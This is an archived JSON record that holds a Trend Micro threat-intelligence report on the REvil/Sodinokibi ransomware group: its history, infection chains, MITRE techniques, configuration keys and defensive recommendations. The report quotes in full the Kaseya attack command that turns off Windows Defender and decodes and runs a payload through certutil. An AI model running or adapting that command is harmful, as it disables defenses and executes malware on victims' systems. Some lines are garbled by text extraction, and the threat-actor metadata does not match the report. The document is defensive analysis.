{
    "id": "820117fa-66a9-44e0-97c2-3eba2909b64b",
    "created_at": "2023-01-12T15:07:04.630096Z",
    "updated_at": "2025-03-27T02:08:36.000294Z",
    "deleted_at": null,
    "sha1_hash": "f544ee4a9fc9d8f0e7be86dc06efc6e6672108c8",
    "title": "2021-12-20 - Ransomware Spotlight- REvil",
    "authors": "",
    "file_creation_date": "2022-05-28T18:14:30Z",
    "file_modification_date": "2022-05-28T18:14:30Z",
    "file_size": 1187651,
    "plain_text": "# Ransomware Spotlight: REvil\n\n**trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-revil**\n\nREvil\n\nBy Trend Micro Research\n\nNow that the reign of REvil has come to an end, it's time to regroup and strategize. What can organizations learn from REvil’s tactics? We\nreview the rise, downfall, and future of its operations using insights into the group's arsenal and inner workings.\n\n\n-----\n\nView infographic of \"Ransomware Spotlight: REvil\"\n\nREvil, also known as Sodinokibi, had risen to notoriety for its high-profile attacks since its discovery in 2019. After being among the most active\n[ransomware variants in 2021, it was officially shut down after garnering the attention of law enforcement agencies due to its attacks on critical](https://www.trendmicro.com/vinfo/us/security/definition/ransomware-as-a-service-raas)\nindustries that resulted in supply shortages and delays. The crackdown led to the arrest of two of its associates and its TOR network being\ntaken offline. However, organizations should not let their guard down. We foresee the group reemerging under a new moniker with the REvil\nname now tarnished and unlikely to entice affiliates.\n\nMeanwhile, it is an opportune time for enterprises to regroup and strategize, starting by learning more about this infamous ransomware’s\noperation.\n\n## History of REvil\n\n[REvil is one example of ransomware as a service (RaaS) that originated from a Russian-speaking underground group. When it was first](https://www.trendmicro.com/vinfo/us/security/definition/ransomware-as-a-service-raas)\n[discovered, connections to the then recently retired GandCrab became apparent. One such connection was the use of an Oracle WebLogic](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/gandcrab-threat-actors-possibly-behind-sodinokibi-ransomware)\nvulnerability, as well as similarities in the URLs and command-and-control (C&C) servers used.\n\n[In 2020, REvil introduced double extortion in its schemes, using stolen files to coerce its victims into paying. Its operators conducted bold](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti)\nattacks on well-known public figures and organizations. Notably, REvil has a history of making good on its threat to publish stolen data via its\nown dedicated leak site. Additionally, it also posted data on underground forums and blog sites.\n\n2021 saw REvil continue to use its techniques in full effect through debilitating attacks that hit major service providers and suppliers. In May, it\n[attacked major meat supplier JBS and IT software provider Kaseya in July. REvil operators also stole blueprints from tech giant Apple via an](https://www.trendmicro.com/en_us/research/21/g/it-management-platform-kaseya-hit-with-sodinokibi-revil-ransomwa.html)\nattack on its supplier, Quanta Computer, in April.\n\n[REvil was also linked to DarkSide, the group that shut down the oil distributor Colonial Pipeline. In a later section, we give a more detailed look](https://www.trendmicro.com/en_us/research/21/e/what-we-know-about-darkside-ransomware-and-the-us-pipeline-attac.html)\ninto the tools used in some of these attacks and hopefully capture the extent of REvil’s arsenal. Our monitoring of Water Mare (the name we\nhave given the intrusion set behind REvil) also yields additional insights.\n\n## Water Mare: REvil behind the scenes\n\nThe connection between Water Mare and REvil dates back to April 2019, its first confirmed deployment. In June 2019, it was advertised by an\nactor with the username UNKN or Unknown (the same as REvil’s) on the XSS forum. It operated as an affiliate service: Affiliates spread the\nransomware to victims while REvil operators maintained the malware and payment infrastructure.\n\n\n-----\n\n0 0, ate a e acqu ed e capab t es a d accesses t at ou d be used utu e attac s t a s to ts a ates ese capab t es\ninclude the PE injection capability using a PowerShell and the credential stealer KPOT stealer, which UNKN won in an auction for its source\ncode. Affiliates also offered access to company networks and a VPN server. Around this time UNKN also made efforts to limit affiliates to\nRussian-speaking members to prevent intrusion.\n\n2021 was a series of highs and lows for Water Mare, culminating in the arrest of several affiliates and the close documentation of REvil’s\ndownfall. The early part of the year promised new developments such as the aforementioned plans for distributed denial-of-service (DDoS)\nattacks, which would have ushered in triple extortion tactics. However, REvil’s biggest attacks — those that hit JBS and Kaseya — pushed law\nenforcement agencies to close in on the group’s heels.\n\nFBI later attributed the Kaseya and JBS attacks to the Water Mare intrusion set. They reportedly gained access to the Water Mare intrusion\nset’s servers and retrieved the master key for REvil, which was provided to Kaseya. Around the same time, distrust for the threat group began\nto take root, with an affiliate claiming to have been bypassed in the negotiation process using a backdoor, foreshadowing REvil’s unraveling.\n\nDespite announcing its return in September, by October 2021 Water Mare’s data leak program became inaccessible and the affiliate program\nterminated. Suspected Water Mare affiliates were also being arrested or tracked down, thanks to the efforts of global law enforcement\nagencies.\n\n## The future of REvil operators\n\nUltimately, REvil’s activities placed it at the top of the list of ransomware operators that governments were eager to crack down on. In a global\neffort, law enforcement went after REvil operators both offline and online, leading to the shutdown of its operations and actual arrests.\n\nBased on our findings from Water Mare, it is unlikely that the intrusion set will resurface under the name REvil because of the amount of\nnegative publicity this moniker had received given the following points:\n\n**Affiliates doubted REvil's operations. The nature of REvil’s shutdown pointed to law enforcement and reports of a backdoor that**\ncheated them from ransom negotiations. Ultimately, this cast considerable doubt on the group’s credibility among threat actors.\n**REvil lacked leadership with the disappearance of UNKN. 0_neday, UNKN’s successor, was unable to inspire renewed confidence in**\nREvil operations. In contrast to UNKN’s efforts to prevent infiltration, 0_neday made serious errors, such as failing to generate new\nprivate keys to the restored data leak site.\n**REvil operated with reduced membership, which led to its shutdown. Efforts to attract affiliates again (such as modifying affiliate**\nprofit cut to 90%) backfired, as these efforts were likely interpreted by other threat actors as a final desperate measure.\n\nWe surmise that the group can persist by rebranding, which is a common tactic among ransomware operators and which has been done by\nthe group before. Case in point, DarkSide has renamed itself as BlackMatter. Meanwhile, REVil’s affiliates are likely to move to other\nransomware operators, if they have not done so already. As for its operators, it is probable that they will continue to work or move to other\nransomware operations, bringing their techniques with them. Therefore, for organizations wondering what’s next, there is still great value in\nunderstanding REvil tactics, techniques, and procedures (TTPs).\n\n## An overview of REvil operations\n\n[One aspect that made REvil’s operation infamous was its heavy extortion tactics. As mentioned earlier, operators behind the ransomware](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti)\ngroup considered DDoS and got in touch directly with customers, business partners, and the media to pressure victims into paying the ransom.\nThey also auctioned stolen data to place more duress on their victims.\n\nREvil is also known for being an example of highly targeted ransomware, as it utilized tools based on its operators’ high-level knowledge of\ntheir targeted entities. This resulted in a varied arsenal and customized infection chains, as we elaborate on later.\n\nTo this end, REvil used tools like FileZilla to exfiltrate data and PsExec to propagate and remotely execute the ransomware and other files. It\nalso used other tools and malware such as PC Hunter, AdFind, BloodHound, NBTScan, SharpSploit, third-party file sync tools, and Qakbot, a\ntrojan used to deliver ransomware.\n\n## Top affected industries and counties\n\nAs our detections show, REvil attacks were concentrated largely in the US, followed by Mexico and Germany by a wide margin. This is\n[consistent with evidence found in the code of REvil that purposely excludes countries in the Commonwealth of Independent States (CIS) as its](https://www.trendmicro.com/en_us/research/21/e/what-we-know-about-darkside-ransomware-and-the-us-pipeline-attac.html)\ntargets.\n\n\n-----\n\nFigure 1. Countries with the highest number of attack attempts for the REvil ransomware (January 1 to December 6, 2021)\n\n_Source: Trend Micro™ Smart Protection Network™ infrastructure_\n\nWe saw the most REvil-related detections in the transportation industry, followed by the financial sector. In our [report summarizing ransomware](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/modern-ransomware-shake-up-banking-government-transportation-sectors-in-1h-2021#cover)\nactivity in the first half of 2021, transportation was already among the top three most targeted sectors, likely for its role in the supply chain and\nlogistics. In general, the top targeted sectors are all critical industries, further emphasizing how REvil had been operating especially in 2021.\n\nFigure 2. Industries with the highest number of attack attempts for the REvil ransomware (January 1 to December 6, 2021)\n\n_Source: Trend Micro Smart Protection Network infrastructure_\n\n## Infection chains and techniques\n\nDue to its targeted nature, REvil used a variety of tools and malware depending what the situation dictated. Its operators appeared to operate\non a high-level of knowledge on their victim’s environment, as evidenced by the level of customization in its attacks.\n\n\n-----\n\nFigure 3. The general infection chain of REvil\n\n**Specific attack flows**\n\nFigure 4. A more targeted attack flow (top) and a simple attack flow (bottom)\n\n\n-----\n\nFigure 5. Infection chain followed in the attack on Quanta Computer\n\nFigure 6. Infection chain followed in the attack on Kaseya\n\nFigure 7. An infection chain based on a more recent campaign\n\n**Initial Access**\n\nThe threat actors behind REvil hired a variety of affiliates for their initial access. These ranged from those with malspam emails with spearphishing links or attachments, RDP access and use of valid accounts, compromised websites, and exploits. These tactics then led to the\ndownload and execution of the payload using normal binaries like CertUtil, PowerShell, or via macro. Threat actors could also take on a more\ntargeted approach by using RDP and PsExec to take control of the network and then deploy the payload. Another recently observed initial\naccess is also possible via supply chain compromise, which could lead to the installation of Sodinstall or Sodinokibi, as observed in the Kaseya\nincident.\n\n**Download and Execution**\n\n\n-----\n\ne e a e so e o t e co o ays t e pay oad as do oaded a d e ecuted, based o at as obse ed a d epo ted p e ous y\n\n[CVE-2019-2725 led to the remote code execution (RCE) of CertUtil or PowerShell to download and execute REvil. There are also](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725)\ninstances where REvil was loaded in memory of PowerShell via reflective load instead of executing a binary.\nMalspam led to a macro that is used to download and execute REvil and malspam with an attachment (such as a PDF) that might drop or\n[download Qakbot in order to download additional components or payloads.](https://www.trendmicro.com/en_us/research/21/k/qakbot-loader-returns-with-new-techniques-and-tools.html)\nDrive-by compromise directly led to REvil.\n[CVE-2018-13379,](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379) [CVE-2019-11510, and valid accounts led to RDP and PsExec, then to the dropping and execution of other](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510)\ncomponents like the antivirus, exfiltration tools, and finally, REvil.\n\n   - Another execution method was through DLL sideloading. This method used a legitimate executable such as MsMpeng.exe to load the\nREvil DLL that is named as a legitimate DLL like MpSvc.dll that is dropped by a custom installer detected as “SODINSTALL.”\n\nCVE-2021-30116, a zero-day vulnerability affecting the Kaseya VSA servers, was also used in the Kaseya supply chain compromise.\nThe payload was dropped to Kaseya's TempPath with the file name agent.exe. The VSA procedure used to deploy the encryptor was\nnamed \"Kaseya VSA Agent Hot-fix.” The \"Kaseya VSA Agent Hot-fix” procedure ran the following:\n```\n   \"C:\\WINDOWS\\system32\\cmd.exe\" /c ping 127.0.0.1 -n 4979 > nul &\n   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true    DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true    EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled    SubmitSamplesConsent NeverSend & copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe & echo %RANDOM% >>\n   C:\\Windows\\cert.exe & C:\\Windows\\cert.exe -decode c:\\\\agent.crt c:\\\\agent.exe & del /q /f c:\\kworking\\agent.crt\n   C:\\Windows\\cert.exe & c:\\\\agent.exe”\n\n```\n**Lateral Movement**\n\nThis happened in the more targeted attack flow where the attackers made use of RDP and PsExec for lateral movement. This is also\nwhere the ransomware and its other components were dropped and executed.\n\n**Discovery**\n\nREvil was also known for using network discovery tools such as AdFind, SharpSploit, BloodHound, and NBTScan. These tools were\nobserved in recent REvil attacks.\n\n**Defense Evasion**\n\nPC Hunter and Process Hacker were observed to be present in the monitored campaigns and can be used to discover and terminate\n[services and processes to disable antivirus products. These are among the legitimate tools commonly weaponized by modern](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021)\nransomware.\nKillAV, meanwhile, is a custom malicious binary designed to uninstall antivirus-related products by either querying the uninstall registry\nand uninstalling the program associated, or by terminating processes from its list.\nA new variant of REvil included a Safeboot routine in its arsenal, which is triggered when “-smode” is supplied as argument for the new\nvariant. These new variants created various RunOnce registries to restart from or to Safemode and bypass security solutions that do not\nwork under Safemode, before proceeding unhindered with its encryption routine.\nAside from execution, the DLL sideloading could also be used to evade detection by running under the context of a legitimate file or\nprocess.\nIn the Kaseya supply chain compromise, PowerShell commands that were used to disable Windows Defender were also observed.\n\n**Credential Access, Exfiltration**\n\nSharpSploit was observed to be one of the tools recently used. This is an attack framework with credential access capabilities using\nMimikatz module.\nGathered information was then sent back to the actors via different methods that were observed, such as the installation of FileZilla to\nfacilitate an FTP transfer, or the use of third-party sync tools like MegaSync, FreeFileSync and Rclone (64-bit).\n\n**Command and Control**\n\nREvil would send a report and system info to its C&C, which was done by generating a pseudorandom URL based on a fixed format and\ngeneration to add to a list of domains in its configuration. The URLs followed this format:\n\n_https://{Domain}/{String 1}/{String 2}/{random characters}.{String 3}_\n\n\n-----\n\ne do a a d t e st gs e e ea t t e o o g\n\nDomain: from a list based on the configuration\nString 1: wp-content, include, content, uploads, static, admin, data, or news\nString 2: images, pictures, image, temp, tmp, graphic, assets, or pics\nString 3: jpg, png, gif\n\n**Impact**\n\nThe impact and encryption process itself did not much since its inception.\n\nIt tried to escalate its privilege via an exploit (code is in the binary) or a token impersonation and create a mutex.\nIt decrypted its JSON config from one of its sections to learn how it would proceed with its routines. This configuration file was an\nencrypted JSON file located in a section of the decrypted binary. It would be decrypted using the RC4 function. The JSON file contained\nthe following configuration:\n\npk → base64 public encryption key of attacker\npid → personal id of the actor\nsub → campaign id\ndbg → debug mode\nfast → fast mode\nwipe → enable wipe of specific directories\nwht → whitelist dictionary\nfld → whitelisted folders\nfls → whitelisted filenames\next → whitelisted file extensions\nwfld → directories to wipe\nprc → processes to kill before the encryption\ndmn → domains to contact after encryption\nnet → send HTTP POST request to domains\nnbody → base64 encoded ransom note body\nnname → ransom note file name\nexp → run exploit if true\nimg → base64 encoded message on desktop background\nsvc → terminated services\nExamples of these routines included processes to terminate, C&C to report to, and extension to use, among others.\n\nIt would then check the keyboard layout or the language of the affected system and avoid a certain list of countries.\n\nAfterward, it would create registry entries for keys, file extensions, and the stats after encryption.\nThe payload would then proceed with its encryption routine, which would be based on the configuration for files to encrypt, keys to use,\nprocesses or directories to terminate or delete, ransom note information, C&C domains, and others.\nLastly, it would proceed with deleting backups like shadow copies and report to its C&C the status of the infection.\n\n## MITRE tactics and techniques\n\n\n**Initial**\n**Access** **Execution** **Persistence** **Privilege Escalation**\n\n\n**Defense**\n**Evasion** **Discovery**\n\n\n**Credential**\n**Access**\n\n\n**Lateral**\n**Movement**\n\n\n-----\n\n**Initial**\n**Access** **Execution** **Persistence** **Privilege Escalation**\n\n\n**Defense**\n**Evasion** **Discovery**\n\n\n**Lateral**\n**Movement**\n\n**T1570 -**\nLateral tool\ntransfer\n\n_Can make_\n_use of RDP_\n_or SMB_\n_admin_\n_shares via_\n_PsExec to_\n_transfer the_\n_ransomware_\n_or tools_\n_within the_\n_network_\n\n\n**T1566 -**\nPhishing\n\n_Arrives via_\n_phishing_\n_emails,_\n_sometimes_\n_with Qakbot_\n_or IcedID_\n\n**T1190 -**\nExploit publicfacing\napplication\n\n_Arrives via_\n_any the_\n_following_\n_exploits:•_\n_CVE-2018-_\n_13379• CVE-_\n_2019-2725•_\n_CVE-2019-_\n_11510• CVE-_\n_2021-30116_\n\n**T1189 -**\nDrive-by\ncompromise\n\n_Makes use of_\n_compromise_\n_websites like_\n_forums to_\n_download_\n_REvil when_\n_accessed_\n\n**T1195 -**\nSupply chain\ncompromise\n\n_Compromised_\n_Kaseya VSA_\n_servers were_\n_used to push_\n_out REvil to_\n_victims._\n\n**T1078 - Valid**\naccounts\n\n_Have been_\n_reported to_\n_make used of_\n_compromised_\n_accounts to_\n_access_\n_victims via_\n_RDP or_\n_RMMs_\n\n\n**T1106 - Execution**\nthrough API\n\n_Uses native API to_\n_execute various_\n_commands/routines_\n\n**T1059 - Command**\nand scripting\ninterpreter\n\n_Uses various_\n_scripting_\n_interpreters like_\n_PowerShell,_\n_Windows command_\n_shell and Visual_\n_Basic (macro in_\n_documents)_\n\n**T1129 - Shared**\nmodules\n\n_Made use of DLL_\n_sideloading to_\n_execute REvil DLLs_\n\n**T1204 - User**\nexecution\n\n_User execution is_\n_needed to carry out_\n_the payload from_\n_the spear-phishing_\n_link/attachments._\n\n\n**T1547 - Boot**\nor logon\nautostart\nexecution\n\n_Creates_\n_registry run_\n_entries for_\n_restarting in_\n_safe mode_\n\n**T1574 -**\nHijack\nexecution\nflow\n\n_Hijacks the_\n_normal_\n_execution of_\n_MsMpeng.exe_\n_and MpSvc.dll_\n_via DLL-_\n_sideloading_\n_technique_\n\n\n**T1134 - Access token**\nmanipulation\n\n_Uses_\n_ImpersonateLoggedOnUser_\n_API to impersonate the_\n_security context of the user_\n_who is logged in_\n\n**T1068 - Exploitation for**\nprivilege escalation\n\n_Makes use of CVE-2018-_\n_8453 to escalate privilege_\n\n**T1574 - Hijack execution**\nflow\n\n_Depending on the privilege_\n_context of the normal_\n_executable file being_\n_abused, might also be used_\n_for privilege escalation_\n\n\n**T1027 -**\nObfuscated\nfiles or\ninformation\n\n_Some_\n_variants (or_\n_its config)_\n_are_\n_obfuscated_\n_to make_\n_detection_\n_more_\n_difficult._\n\n_Some_\n_variants_\n_have a_\n_custom_\n_packer to_\n_make_\n_analysis or_\n_detection_\n_more_\n_difficult._\n\n**T1562 -**\nImpair\ndefenses\n\n_Disables_\n_security-_\n_related_\n_software by_\n_running in_\n_safe mode_\n_or_\n_terminating_\n_them_\n\n**T1574 -**\nHijack\nexecution\nflow\n\n_DLL_\n_sideloading_\n_can also be_\n_used as a_\n_form of_\n_defense_\n_evasion._\n\n\n**T1083 - File**\nand directory\ndiscovery\n\n_Searches for_\n_specific files_\n_and directory_\n_related to its_\n_encryption_\n\n**T1018 -**\nRemote system\ndiscovery\n\n_Makes use of_\n_tools for_\n_network scans_\n\n**T1057**\n\n- Process\ndiscovery\n\n_Discovers_\n_certain_\n_processes for_\n_process_\n_termination_\n\n**T1082 - System**\ninformation\ndiscovery\n\n_Identifies_\n_keyboard layout_\n_and other_\n_system_\n_information_\n\n**T1012 - Query**\nregistry\n\n_Queries certain_\n_registries as_\n_part of its_\n_routine_\n\n**T1063**\n\n- Security\nsoftware\ndiscovery\n\n_Discovers_\n_security_\n_software for_\n_reconnaissance_\n_and termination_\n\n\n**Credential**\n**Access**\n\n**T1003 - OS**\ncredential\ndumping\n\n_Might utilize_\n_tools like_\n_SharpSploit,_\n_which_\n_contains_\n_Mimikatz_\n_module_\n\n**T1552 -**\nUnsecured\ncredentials\n\n_Might utilize_\n_tools like_\n_SharpSploit,_\n_which_\n_contains_\n_Mimikatz_\n_module_\n\n\n## Summary of malware, tools, and exploits used\n\nSecurity teams can watch out for the presence of the following malware tools and exploits that are typically used in REvil attacks:\n\n\n**Credential**\n**Access**\n\n\n**Lateral**\n**Movement**\n\n\n**Defense**\n**Evasion** **Exfiltrat**\n\n\n**Initial Entry** **Execution** **Discovery**\n\n\n**Privilege**\n**Escalation**\n\n\n-----\n\n**Credential**\n**Access**\n\n\n**Lateral**\n**Movement**\n\n\n**Defense**\n**Evasion** **Exfiltrat**\n\n\n**Initial Entry** **Execution** **Discovery**\n\n\nPhishing\nemails\nExploits:\n\nCVE201813379\nCVE20192725\nCVE201911510\nCVE202130116\n\n## Recommendations\n\n\nSodinstall\n(DLL\nsideloading)\nQakbot\nIcedID\n\n\nNetscan.exe\nNBTScan\nAdFind\nBloodHound\nSharpSploit\nKillAV\n\n\n**Privilege**\n**Escalation**\n\nCVE-20188453\nSodinstall\n(DLL\nsideloading)\n\n\nSharpSploit RDP\nPsExec\n\n\nKillAV\nProcess\nHacker\nPC Hunter\nSodinstall\n(DLL\nsideloading)\n\n\nRc\nFre\nMe\nFile\n\n\nWhile REvil operations have been shut down, it is likely that organizations, government bodies, and perhaps even ordinary consumers will not\neasily forget the consequences of its attack. Affiliates that have been involved in the attack could take up other ransomware operators, while\nREvil TTPs can be mimicked in newer campaigns. In the meantime, during the current shutdown, it is a good opportunity to learn from REvil as\nthe group lies low.\n\nTo help defend systems against similar threats, organizations can establish security frameworks that can allocate resources systematically for\nestablishing a solid defense against ransomware.\n\nHere are some best practices that can be included in these frameworks:\n\n**Audit and inventory**\n\nTake an inventory of assets and data.\nIdentify authorized and unauthorized devices and software.\nMake an audit of event and incident logs.\n\n**Configure and monitor**\n\nManage hardware and software configurations.\nGrant admin privileges and access only when necessary to an employee’s role.\nMonitor network ports, protocols, and services.\nActivate security configurations on network infrastructure devices such as firewalls and routers.\nEstablish a software allow list that only executes legitimate applications.\n\n**Patch and update**\n\nConduct regular vulnerability assessments.\nPerform patching or virtual patching for operating systems and applications.\nUpdate software and applications to their latest versions.\n\n**Protect and recover**\n\nImplement data protection, backup, and recovery measures.\nEnable multifactor authentication (MFA).\n\n**Secure and defend**\n\nEmploy sandbox analysis to block malicious emails.\nDeploy the latest versions of security solutions to all layers of the system including email endpoint web and network\n\n\n-----\n\netect ea y s g s o a attac suc as t e p ese ce o susp c ous too s t e syste\nUse advanced detection technologies such as those powered by AI and machine learning.\n\n**Train and test**\n\nRegularly train and assess employees on security skills.\nConduct red-team exercises and penetration tests.\n\nA multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network). Security\nsolutions can detect malicious components and suspicious behavior could help protect enterprises.\n\n[Trend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools](https://www.trendmicro.com/en_us/business/products/detection-response.html)\nearly on before the ransomware can do irreversible damage to the system.\n[Trend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html)\nprotection is made possible through techniques such as virtual patching and machine learning.\n[Trend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block](https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/email-inspector.html)\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\n[Trend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\nand ransomware, ensuring the protection of endpoints.\n\n## Indicators of Compromise\n\nThe IOCs for this article can be found [here. Actual indicators might vary per attack.](https://documents.trendmicro.com/images/TEx/articles/iocs_revil_spotlight1bGglfj.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-20 - Ransomware Spotlight- REvil.pdf"
    ],
    "report_names": [
        "2021-12-20 - Ransomware Spotlight- REvil.pdf"
    ],
    "threat_actors": [
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536024,
    "ts_updated_at": 1743041316,
    "ts_creation_date": 1653761670,
    "ts_modification_date": 1653761670,
    "files": {
        "pdf": "https://archive.orkl.eu/f544ee4a9fc9d8f0e7be86dc06efc6e6672108c8.pdf",
        "text": "https://archive.orkl.eu/f544ee4a9fc9d8f0e7be86dc06efc6e6672108c8.txt",
        "img": "https://archive.orkl.eu/f544ee4a9fc9d8f0e7be86dc06efc6e6672108c8.jpg"
    }
}